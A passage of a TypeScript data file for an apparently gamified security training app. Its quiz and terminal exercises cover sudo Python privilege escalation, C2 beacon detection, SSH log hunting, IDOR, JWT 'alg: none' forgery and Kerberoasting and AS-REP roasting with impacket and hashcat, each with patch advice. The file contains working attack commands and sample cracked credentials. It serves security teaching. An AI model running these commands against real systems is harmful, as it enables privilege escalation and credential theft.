              { id: 'sudo_2', text: '\'import os; os.system("id")\'', isCorrect: false },
              { id: 'sudo_3', text: '\'print("hello")\'', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'GTFOBins Python Sudo PrivEsc',
              whyItWorks: 'The Python pty module allocates a new pseudo-terminal inheriting effective UID 0 from the sudo process execution.',
              patchRecommendation: 'Never permit unrestricted execution of interpreters in /etc/sudoers. Whitelist signed, specific shell scripts.',
              terminalProof: '$ sudo python3 -c \'import pty; pty.spawn("/bin/bash")\'\nroot@target:/home/devuser# id\nuid=0(root) gid=0(root) groups=0(root)'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_defense_soc',
    title: 'Module 4: SOC, Threat Hunting & SIEM',
    certificationFocus: 'CompTIA CySA+ CS0-003 & Blue Team Level 1',
    color: '#EF4444', // Crimson Red
    nodes: [
      {
        id: 'node_soc_1',
        title: 'C2 Beaconing Detection & Jitter Analysis',
        subtitle: 'Detecting periodic covert channels masked via DNS and HTTPS',
        moduleId: 'mod_defense_soc',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 120,
        eloReward: 30,
        questions: [
          {
            id: 'q_c2_hunting',
            title: 'Proxy Log Analysis: Cobalt Strike Beacon Detection',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Analyze the sequence of DNS queries extracted from an infected host SIEM log. Which statistical parameter confirms an active C2 channel with jitter?',
            codeSnippet: `Timestamp             Query Domain                             Bytes   Interval
2026-10-17T14:00:00Z  update.cdn-microsoft-sync.com            64      -
2026-10-17T14:00:58Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:02:03Z  update.cdn-microsoft-sync.com            64      65s
2026-10-17T14:03:01Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:03:59Z  update.cdn-microsoft-sync.com            64      58s
2026-10-17T14:05:04Z  update.cdn-microsoft-sync.com            64      65s`,
            options: [
              { id: 'c1', text: 'Regular ~60-second cadences with a ~10% standard deviation (10% Jitter) towards a typosquatted domain', isCorrect: true },
              { id: 'c2', text: 'DNS packet payloads exceed typical sizes for standard A record replies', isCorrect: false },
              { id: 'c3', text: 'The target domain is signed with an invalid DNSSEC chain', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1071.004: Application Layer Protocol (DNS C2)',
              whyItWorks: 'C2 frameworks like Cobalt Strike introduce randomized jitter around sleep intervals to evade fixed-interval threshold filters.',
              patchRecommendation: 'Configure SIEM correlation rules calculating inter-request timing deltas and alert on newly registered domains (<30 days).',
              terminalProof: '$ tshark -r capture.pcap -Y "dns.qry.name contains microsoft-sync" -T fields -e frame.time_delta\n58.129482010\n64.981048201'
            },
            xpReward: 60,
            eloReward: 20
          },
          {
            id: 'q_terminal_grep_auth',
            title: 'Terminal Sandbox: SSH Brute Force Hunting in auth.log',
            type: 'terminal_command',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Complete the bash command to extract all unique IP addresses with failed SSH password attempts from /var/log/auth.log:',
            terminalPrompt: 'soc-analyst@siem:~$',
            commandPrefix: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' |',
            commandTarget: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr',
            commandChips: ['sort | uniq -c | sort -nr', 'tail -n 20', 'wc -l', 'rm -rf /tmp', '| iptables -A INPUT'],
            options: [
              { id: 'grep_1', text: 'sort | uniq -c | sort -nr', isCorrect: true },
              { id: 'grep_2', text: 'tail -n 20', isCorrect: false },
              { id: 'grep_3', text: 'wc -l', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'SSH Credential Stuffing & Log Parsing',
              whyItWorks: 'In OpenSSH logs, "Failed password for ... from <IP> port <PORT>" places the IP address 4 fields from the end (NF-3). Sorting and counting reveals attack volume.',
              patchRecommendation: 'Install and configure Fail2ban or CrowdSec to automatically ban offending IP addresses after 3 consecutive failures.',
              terminalProof: '$ grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr\n   4912 185.220.101.5\n   1240 194.26.29.11'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_api_jwt',
    title: 'Module 5: API Security & JWT Exploitation',
    certificationFocus: 'OWASP API Security Top 10 & CEH v13 Web Applications',
    color: '#8B5CF6', // Purple / Violet
    nodes: [
      {
        id: 'node_api_jwt_1',
        title: 'BOLA / IDOR: Broken Object Level Authorization',
        subtitle: 'Bypassing horizontal access control by tampering with REST API resource identifiers',
        moduleId: 'mod_api_jwt',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 95,
        eloReward: 28,
        questions: [
          {
            id: 'q_api_spot_bola',
            title: 'Spot the Zero-Day: Missing IDOR Authorization in Node.js Controller',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'A REST endpoint allows authenticated operators to download confidential documents. TAP THE LINE where ownership verification between session and record is missing:',
            codeLines: [
              { lineNum: 1, code: 'app.get("/api/v1/invoices/:id", authenticateUser, async (req, res) => {' },
              { lineNum: 2, code: '  const invoiceId = req.params.id;' },
              { lineNum: 3, code: '  const invoice = await db.invoices.findById(invoiceId);', isVulnerable: true, vulnerabilityHint: 'The query fetches the invoice solely by :id without scoping to req.user.id!' },
              { lineNum: 4, code: '  if (!invoice) return res.status(404).json({ error: "Not found" });' },
              { lineNum: 5, code: '  res.json(invoice);' },
              { lineNum: 6, code: '});' }
            ],
            options: [
              { id: 'bola_1', text: 'Line 3: Database loads invoice by ID without verifying req.user.tenantId / req.user.id', isCorrect: true },
              { id: 'bola_2', text: 'Line 1: authenticateUser does not support async promises', isCorrect: false },
              { id: 'bola_3', text: 'Line 4: Status 404 generates memory leaks', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'OWASP API1:2023 - Broken Object Level Authorization (BOLA)',
              whyItWorks: 'The server authenticates the caller but neglects resource authorization. Changing :id from 1004 to 1005 allows reading arbitrary customer data.',
              patchRecommendation: 'Scope queries to the current authenticated tenant: `db.invoices.findOne({ _id: invoiceId, ownerId: req.user.id })`.',
              terminalProof: '$ curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.corp/api/v1/invoices/9924\nHTTP/1.1 200 OK\n{"id": 9924, "owner": "ceo@corp.com", "salary_usd": 185000}'
            },
            xpReward: 50,
            eloReward: 14
          },
          {
            id: 'q_jwt_alg_none',
            title: 'JWT Algorithm Confusion: "alg": "none" Attack',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Hardcore',
            prompt: 'In a vulnerable JWT library, what happens when an attacker modifies the token header to {"alg": "none", "typ": "JWT"} and drops the signature?',
            options: [
              { id: 'alg_1', text: 'The parser treats the token as valid without verifying any cryptographic signature, enabling arbitrary admin impersonation', isCorrect: true },
              { id: 'alg_2', text: 'The server attempts to decrypt the payload with a null RSA private key', isCorrect: false },
              { id: 'alg_3', text: 'A Certificate Revocation List (CRL) exception is automatically triggered', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CVE-2015-9235: JSON Web Token "none" Algorithm Vulnerability',
              whyItWorks: 'RFC 7519 originally allowed "none" for unsecured tokens. Flawed verification libraries accepted "none" without enforcing required algorithms.',
              patchRecommendation: 'Explicitly enforce an algorithm whitelist: `jwt.verify(token, secret, { algorithms: ["HS256"] })`.',
              terminalProof: '$ echo -n \'{"alg":"none","typ":"JWT"}\' | base64\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=\n$ curl -H "Cookie: token=eyJhbGciOiJub25l...eyJyb2xlIjoiYWRtaW4ifQ." https://bank.internal/admin\nHTTP/1.1 200 OK (Admin Dashboard)'
            },
            xpReward: 55,
            eloReward: 16
          }
        ]
      }
    ]
  },
  {
    id: 'mod_active_directory',
    title: 'Module 6: Active Directory & Enterprise Lateral Movement',
    certificationFocus: 'Certified Ethical Hacker (CEH v13) & CompTIA Security+ Enterprise',
    color: '#EC4899', // Pink / Rose
    nodes: [
      {
        id: 'node_ad_kerberoast',
        title: 'Kerberoasting & TGS Ticket Extraction',
        subtitle: 'Requesting and offline cracking TGS tickets for domain Service Principal Names (SPNs)',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 110,
        eloReward: 32,
        questions: [
          {
            id: 'q_kerberoast_concept',
            title: 'Kerberoasting Attack Mechanism',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Why can any authenticated Active Directory domain user request a TGS ticket for a service account with a registered SPN without raising immediate alarms?',
            options: [
              { id: 'kb_1', text: 'The Kerberos KDC legitimately issues the TGS encrypted with the service account\'s NTLM password hash so the client can authenticate', isCorrect: true },
              { id: 'kb_2', text: 'TGS tickets are transmitted in plaintext without symmetric encryption', isCorrect: false },
              { id: 'kb_3', text: 'Active Directory does not require authentication for LDAP queries on port 389', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.003: Steal or Forge Kerberos Tickets (Kerberoasting)',
              whyItWorks: 'Because the TGS is encrypted with the service account password hash, an attacker extracts it and performs offline brute-force cracking with Hashcat without generating further DC network traffic.',
              patchRecommendation: 'Use Group Managed Service Accounts (gMSA) with 128-character automatically rotated passwords, or enforce AES Kerberos encryption (Event ID 4769).',
              terminalProof: '$ impacket-GetUserSPNs corp.local/operator:Password123 -request\n$ hashcat -m 13100 kerberoast_tgs.hash /usr/share/wordlists/rockyou.txt\nHash.Target: $krb5tgs$23$*...\nStatus: Cracked (Password: SqlAdmin2024!)'
            },
            xpReward: 60,
            eloReward: 18
          },
          {
            id: 'q_terminal_rubeus',
            title: 'Terminal Sandbox: AS-REP Roasting with Impacket',
            type: 'terminal_command',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Complete the Impacket command to query the Domain Controller (10.0.0.1) and extract Kerberos hashes for accounts with DONT_REQ_PREAUTH enabled:',
            terminalPrompt: 'kali@attacker-box:~$',
            commandPrefix: 'impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat',
            commandTarget: 'impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes',
            commandChips: ['-outputfile asrep.hashes', '--no-pass', '-k -no-preauth', '| tee /tmp/log', '--aes256'],
            options: [
              { id: 'np_1', text: '-outputfile asrep.hashes', isCorrect: true },
              { id: 'np_2', text: '--no-pass', isCorrect: false },
              { id: 'np_3', text: '-k -no-preauth', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.004: AS-REP Roasting',
              whyItWorks: 'When an AD user has the "Do not require Kerberos preauthentication" flag enabled, the KDC issues an AS-REP containing an encrypted timestamp without prior authentication proof.',
              patchRecommendation: 'Audit domain user account flags and ensure `DONT_REQ_PREAUTH` is disabled for all accounts.',
              terminalProof: '$ impacket-GetNPUsers -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes\n[*] Written 3 AS-REP hashes to asrep.hashes\n$ hashcat -m 18200 asrep.hashes rockyou.txt\nCracked: svc_backup:Summer2024'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  }
];

export const SKILL_MODULES: SkillModule[] = SKILL_MODULES_EN;

export function getSkillModules(lang: Language = getSavedLanguage()): SkillModule[] {
  // English is the official standardized cybersecurity curriculum
  return SKILL_MODULES_EN;
}
